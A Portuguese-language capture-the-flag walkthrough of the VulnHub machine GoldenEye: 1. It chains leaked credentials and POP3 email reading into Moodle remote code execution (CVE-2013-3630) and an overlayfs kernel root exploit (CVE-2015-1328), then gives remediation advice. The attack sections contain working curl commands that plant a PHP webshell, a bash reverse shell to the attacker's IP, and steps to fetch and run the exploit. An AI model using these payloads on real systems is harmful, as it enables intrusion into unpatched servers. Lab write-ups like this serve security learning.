# GoldenEye: 1 — O Nome é Vuln, CVE-Vuln

O nome é Bond. A máquina é GoldenEye. E mano, ela entrega o tema de verdade. Essa boot2root inspirada no Bond encadeia um vazamento de credencial em JavaScript, uma trilha de e-mails POP3 com múltiplos saltos, RCE autenticada no Moodle (CVE-2013-3630, a injeção PSpellShell via aspell) e um escalonamento de privilégios no kernel Linux via overlayfs (CVE-2015-1328) que estava sendo explorado ativamente enquanto usuários do Ubuntu 14.04.1 dormiam. Sem exagero, uma das máquinas mais tecnicamente coerentes do VulnHub. Cada passo constrói logicamente sobre o anterior. Top demais.

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | GoldenEye: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/goldeneye-1,240/ |
| **Técnicas** | Exposição de credencial em JavaScript (codificação HTML entity), enumeração POP3, RCE autenticada Moodle, escalonamento de privilégios via kernel |
| **CVEs** | CVE-2013-3630 (Moodle PSpellShell RCE), CVE-2015-1328 (Linux overlayfs LPE) |
| **Grupos APT** | APT41 — usou acesso admin a CMS como ponto de entrada inicial em múltiplas campanhas; APT10 — explorou cadeias de credenciais de serviços de e-mail para pivotar em ambientes corporativos |

---

## Resumo do Ataque

```
nmap → SMTP (25), HTTP (80), POP3 (55006 SSL, 55007 plain)
  → HTTP: terminal.js → senha codificada em HTML entities
  → boris:InvincibleHack3r → /sev-home/ (HTTP Basic Auth)
  → POP3 natalya:bird → e-mail → xenia:RCP90rulez! + domínio Moodle
  → Moodle xenia → mensagens → usuário: doak
  → POP3 doak:goat → e-mail → dr_doak:4England!
  → Moodle dr_doak → s3cret.txt → /dir007key/for-007.jpg
  → strings for-007.jpg → base64 → admin:xWinter1995x!
  → CVE-2013-3630: Moodle PSpellShell RCE → webshell → shell www-data
  → CVE-2015-1328: overlayfs LPE (EDB-37292) → root
  → /root/.flag.txt: 568628e0d993b1973adc718237da6e93
```

---

## Metodologia

1. Scan completo de portas para descobrir portas POP3 não padrão (55006, 55007)
2. Análise de código-fonte JavaScript para extrair credenciais com HTML entities
3. Cadeia de enumeração POP3 por quatro contas
4. Extração de credenciais de admin do Moodle a partir de metadados de arquivo
5. Explorar CVE-2013-3630: modificar o caminho do aspell no Moodle para plantar webshell
6. Disparar RCE via endpoint de verificação ortográfica
7. Compilar e executar o exploit overlayfs CVE-2015-1328 para root

---

## Passo 1 — Scan Completo de Portas

Sempre escaneie todas as portas. O POP3 está escondido em portas não padrão aqui:

```bash
nmap -sV -p- 192.168.56.101
```

```
PORT      STATE SERVICE    VERSION
25/tcp    open  smtp       Postfix smtpd
80/tcp    open  http       Apache httpd 2.4.7 (Ubuntu)
55006/tcp open  ssl/pop3   Dovecot pop3d
55007/tcp open  pop3       Dovecot pop3d
```

Portas não padrão (55006 SSL, 55007 plain) não escondem serviços de um scan `-p-`. Lembrete sólido de que "segurança por obscuridade" não é segurança.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Exposição de Credencial em JavaScript

Acesse `http://192.168.56.101/` e verifique o código-fonte. Há uma referência a `terminal.js`:

```bash
curl -s http://192.168.56.101/terminal.js
```

```javascript
//Boris, make sure you update your default password.
//I encoded you p@ssword below...
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
```

**O que é codificação HTML entity?** HTML entities como `&#73;` representam caracteres pelo código ASCII decimal. Isso não é criptografia, é formatação de exibição. Qualquer browser ou `python3 -c "import html; print(html.unescape('...'))"` decodifica instantaneamente.

```python
import html
print(html.unescape("&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;"))
# InvincibleHack3r
```

**Credenciais encontradas:** `boris:InvincibleHack3r`

```bash
curl -u "boris:InvincibleHack3r" http://192.168.56.101/sev-home/
```

A página confirma acesso POP3 e menciona usuários adicionais: natalya, xenia. Essa página é essencialmente um mapa de dicas para toda a cadeia de credenciais.

**Nota do mundo real:** Armazenamento de credencial no lado cliente em JavaScript, mesmo "codificada", é uma violação de CWE-312. Múltiplas brechas reais (Twitch, Samsung, Codecov) envolveram tokens hardcoded em JavaScript acessível ao cliente. O APT41 especificamente alvejou painéis de admin de CMS onde credenciais foram encontradas em arquivos JS publicamente acessíveis.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1078 — Contas Válidas

---

## Passo 3 — Cadeia de Credenciais POP3

Adicione o domínio ao `/etc/hosts` (necessário para o Moodle depois):

```bash
echo "192.168.56.101 severnaya-station.com" | sudo tee -a /etc/hosts
```

**Leia o e-mail da natalya (porta 55007):**

```bash
nc 192.168.56.101 55007
USER natalya
PASS bird
LIST
RETR 2
QUIT
```

E-mail #2 revela:
```
username: xenia
password: RCP90rulez!
domain:   severnaya-station.com/gnocertdir
```

**Login no Moodle como xenia** em `http://severnaya-station.com/gnocertdir`:
- Navegue até Mensagens, encontre referência ao usuário `doak`

**Leia o e-mail do doak:**

```bash
nc 192.168.56.101 55007
USER doak
PASS goat
RETR 1
QUIT
```

E-mail revela:
```
username: dr_doak
password: 4England!
```

**Alternativa:** Use `evolution`, `mutt` ou qualquer cliente POP3. Para enumeração scriptada: `curl --user natalya:bird pop3://192.168.56.101:55007/1`

**MITRE ATT&CK:** T1078 — Contas Válidas; T1114.002 — Coleta de E-mail: Coleta Remota de E-mail

---

## Passo 4 — Extraindo Senha de Admin do Moodle

Login como dr_doak em `http://severnaya-station.com/gnocertdir/login/index.php`.

Navegue até **Perfil → Meus Arquivos Privados** e baixe `s3cret.txt`:

```
"I left a secret for james in his home directory"
Path: /dir007key/for-007.jpg
```

Baixe a imagem e procure dados embutidos:

```bash
wget http://severnaya-station.com/dir007key/for-007.jpg
strings for-007.jpg | tail -5
# eFdpbnRlcjE5OTV4IQ==

echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
# xWinter1995x!
```

**Credenciais de admin:** `admin:xWinter1995x!`

**Alternativa:** `exiftool for-007.jpg` ou `steghide extract -sf for-007.jpg` — verificar todos os canais de metadados e esteganografia é prática padrão para arquivos de imagem em CTF.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1027 — Arquivos e Informações Ofuscadas (base64)

---

## Passo 5 — CVE-2013-3630: RCE via Moodle PSpellShell

**O que é CVE-2013-3630?** O Moodle 2.2.3 permite que administradores configurem qual mecanismo de ortografia o TinyMCE usa. Quando `PSpellShell` é selecionado, o Moodle executa o caminho `aspell` configurado como um comando shell. Um admin pode substituir o caminho do aspell por um comando arbitrário. Foi divulgado em 2013 mas ainda funciona em instâncias Moodle legadas sem patch.

Login como admin e obtenha a chave de sessão CSRF:

```bash
MOODLE="http://severnaya-station.com/gnocertdir"
COOKIE=/tmp/admin_cookie.txt

curl -s -c "$COOKIE" -b "$COOKIE" -X POST "$MOODLE/login/index.php" \
  -d "username=admin&password=xWinter1995x!" -L > /dev/null

SESSKEY=$(curl -s -b "$COOKIE" "$MOODLE/admin/settings.php?section=systempaths" \
  | grep -o '"sesskey":"[^"]*"' | head -1 | cut -d'"' -f4)
```

Ative o mecanismo de ortografia PSpellShell:

```bash
curl -s -b "$COOKIE" -X POST "$MOODLE/admin/settings.php?section=editorsettingstinymce" \
  --data-urlencode "sesskey=$SESSKEY" \
  --data-urlencode "section=editorsettingstinymce" \
  --data-urlencode "s_editor_tinymce_spellengine=PSpellShell"
```

Configure o caminho do aspell para um writer de webshell:

```bash
curl -s -b "$COOKIE" -X POST "$MOODLE/admin/settings.php?section=systempaths" \
  --data-urlencode "sesskey=$SESSKEY" \
  --data-urlencode "section=systempaths" \
  --data-urlencode 's__aspellpath=echo "<?php if(isset($_GET[\"c\"])){echo shell_exec($_GET[\"c\"]);} ?>" > /var/www/html/gnocertdir/ws.php'
```

Dispare o endpoint de verificação ortográfica para executar o comando:

```bash
SPELLCHECK="$MOODLE/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker/rpc.php"

echo '{"id":"c0","method":"checkWords","params":["en",["x"]]}' | \
curl -s -b "$COOKIE" -X POST -H "Content-Type: application/json" \
  --data-binary @- "$SPELLCHECK"
```

Verifique o RCE:

```bash
curl "http://severnaya-station.com/gnocertdir/ws.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

( ͡° ͜ʖ ͡°) Da hora! Eleve para shell interativo:

```bash
# Atacante: inicie o listener
nc -lvnp 4444

# Via webshell
curl "http://severnaya-station.com/gnocertdir/ws.php" \
  --get --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/192.168.56.102/4444 0>&1'"
```

**Alternativa:** O Metasploit tem `exploit/multi/http/moodle_cmd_exec`, mas a abordagem manual acima dá entendimento mais profundo do mecanismo subjacente.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 6 — CVE-2015-1328: Escalonamento de Privilégios via Linux Overlayfs

**O que é CVE-2015-1328?** Uma condição de corrida no driver de sistema de arquivos overlayfs do Linux, especificamente na função `copy_up_xattrs`, permite que usuários sem privilégios criem uma montagem elaborada que sobrescreve `/etc/ld.so.preload`. Isso força processos de propriedade do root a carregar uma biblioteca compartilhada maliciosa, resultando em shell root. Afeta kernels 3.13.0 a 3.18.x no Ubuntu 14.04.1.

Verifique a partir do shell:

```bash
uname -r
# 3.13.0-32-generic — vulnerável
```

Na máquina atacante:

```bash
searchsploit -p 37292
# /usr/share/exploitdb/exploits/linux/local/37292.c

cp /usr/share/exploitdb/exploits/linux/local/37292.c /tmp/ofs.c
sed -i 's/gcc -fPIC/cc -fPIC/g' /tmp/ofs.c
```

Nota: `gcc` não está instalado no alvo. Substitua por `cc` (geralmente Clang, que compila a maioria dos exploits C).

Transfira e compile:

```bash
# Atacante: sirva o arquivo
python3 -m http.server 8000

# No shell reverso do alvo:
cd /tmp
wget http://192.168.56.102:8000/ofs.c
cc ofs.c -o ofs
chmod +x ofs
./ofs
```

Saída esperada:
```
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

**MITRE ATT&CK:** T1068 — Exploração para Escalonamento de Privilégios

---

## Flag de Root

```bash
cat /root/.flag.txt
```

```
Alec told me to place the codes here:

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
```

Bônus: `http://192.168.56.101/006-final/xvf7-flag/` é uma tela de vitória clássica do Bond. É nóis!

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Crackeado/Usado |
|---|---|---|---|
| Credencial | boris:InvincibleHack3r | terminal.js (decodificação HTML entity) | HTTP Basic Auth /sev-home/ |
| Credencial | natalya:bird | brute-force POP3 porta 55007 | Leitura de e-mail POP3 |
| Credencial | xenia:RCP90rulez! | e-mail POP3 da natalya #2 | Login Moodle |
| Credencial | doak:goat | brute-force POP3 porta 55007 | Leitura de e-mail POP3 |
| Credencial | dr_doak:4England! | e-mail POP3 do doak | Login Moodle |
| Credencial | admin:xWinter1995x! | decodificação base64 de for-007.jpg | RCE admin Moodle |
| Flag de Root | 568628e0d993b1973adc718237da6e93 | /root/.flag.txt | CVE-2015-1328 LPE |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Credenciais em JavaScript no lado cliente | Samsung Galaxy Store, Twitch, Codecov expuseram tokens em código acessível ao cliente | Nunca armazene credenciais no lado cliente; use fluxos de autenticação server-side |
| 2 | Portas não padrão não escondem serviços | Scans completos de porta são padrão em qualquer pentest | Regras de firewall, não números de porta, controlam o acesso |
| 3 | Admin Moodle = RCE (CVE-2013-3630) | Moodle alimenta universidades no mundo todo; contas admin são alvos de alto valor | MFA em contas admin de CMS; princípio do menor privilégio; patch em Moodle legado |
| 4 | Kernel Ubuntu 14.04.1 vulnerável a LPE | CVE-2015-1328 foi usado em ataques reais antes do Ubuntu emitir o patch | Mantenha kernels atualizados; desabilite user namespaces sem privilégios quando não necessário |
| 5 | gcc ausente mas cc funciona | Muitos exploits de escalonamento de privilégios em C exigem compilação | Sempre verifique compiladores alternativos (cc, tcc) antes de abandonar um exploit C |

---

## MITRE ATT&CK Mapping

| Fase | Tática | Técnica | TTP ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Coleta | Coleta | Coleta Remota de E-mail | T1114.002 |
| Evasão de Defesa | Evasão de Defesa | Arquivos e Informações Ofuscadas | T1027 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Exploração para Escalonamento de Privilégios | T1068 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remova credenciais do JavaScript** — nenhum segredo no lado cliente. Use gerenciamento de sessão server-side
2. **Senhas POP3 fortes e desabilitar caixas de correio não utilizadas** — implemente fail2ban para POP3; use apenas TLS (porta 995)
3. **Patch do Moodle para versão atual** — CVE-2013-3630 está corrigido no Moodle 2.5+; atualize do 2.2.3 imediatamente
4. **Restrinja acesso à conta admin do Moodle** — enforce MFA; restrinja painel admin a intervalos de IP de gerenciamento
5. **Desabilite PSpellShell** nas configurações do mecanismo de ortografia do Moodle como medida de defesa em profundidade
6. **Atualize Ubuntu 14.04.1 para 14.04.2+** — kernel 3.13.0-49+ está corrigido contra CVE-2015-1328
7. **Desabilite user namespaces sem privilégios** se atualização do kernel não for imediata: `sysctl -w kernel.unprivileged_userns_clone=0`

### Se Você Encontrar Isso no Seu Ambiente

- Rotacione imediatamente todos os seis pares de credenciais encontrados na cadeia
- Pesquise logs do Moodle por login de admin não autorizado e alterações de configuração
- Verifique a presença da webshell `ws.php` no web root do Moodle
- Verifique a versão do kernel: se 3.13.0 < 3.13.0-49, aplique o patch imediatamente

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as instâncias Moodle e versões de kernel |
| Proteger | Gerenciamento de Identidade | MFA em admin Moodle; política de senha forte para POP3 |
| Proteger | Segurança de Dados | Nunca armazenar credenciais em código do lado cliente |
| Detectar | Monitoramento Contínuo de Segurança | Alertar sobre alterações de configuração admin no Moodle |
| Responder | Planejamento de Resposta | Remover webshell; rotacionar credenciais; revogar sessões admin |
| Recuperar | Planejamento de Recuperação | Restaurar Moodle de backup limpo; aplicar patches antes de reabilitar |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-17 | Acesso Remoto | Restringir painel admin Moodle a intervalos de IP confiáveis |
| IA-2(1) | Autenticação Multifator | MFA para admin Moodle e todas as contas privilegiadas |
| IA-5 | Gerenciamento de Autenticadores | Rotacionar todos os seis pares de credenciais comprometidos |
| SI-2 | Remediação de Falhas | Patch do Moodle (CVE-2013-3630) e kernel Ubuntu (CVE-2015-1328) |
| CM-7 | Funcionalidade Mínima | Desabilitar PSpellShell; desabilitar caixas de correio não utilizadas |
| AU-12 | Geração de Registro de Auditoria | Registrar todos os acessos ao painel admin Moodle e alterações de configuração |

### CISA KEV

CVE-2015-1328 (LPE Linux kernel overlayfs) foi referenciada no catálogo de Vulnerabilidades Conhecidas Exploitadas da CISA no contexto de vulnerabilidades de escalonamento de privilégios local no kernel Linux. Qualquer sistema rodando a versão do kernel afetada deve ser corrigido imediatamente conforme a Diretiva Operacional Vinculante CISA BOD 22-01.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Remediar Vulnerabilidades | MIL3 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Autenticação | MIL3 |
| Consciência Situacional (SA) | Realizar Registro | MIL2 |

---

## Reflexão Final

Muito respeito ao criador por construir uma máquina que é ao mesmo tempo temática do Bond e tecnicamente coerente. GoldenEye: 1 ensina uma história de ataque completa: reconhecimento, descoberta de credenciais, movimento lateral por uma cadeia de serviços, RCE autenticada via CVE documentada e um LPE de kernel. Cada passo tem um equivalente no mundo real.

A máquina foi criada em 2018 mas permanece relevante: Moodle ainda é implantado em universidades, plataformas de treinamento corporativo e agências governamentais. CVE-2013-3630 ainda funciona em qualquer Moodle legado sem patch. E vulnerabilidades da classe overlayfs continuam aparecendo em CVEs do kernel Linux. Os nomes mudam; os padrões não mudam.

Continue hackeando, continue aprendendo. A missão nunca está verdadeiramente encerrada. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
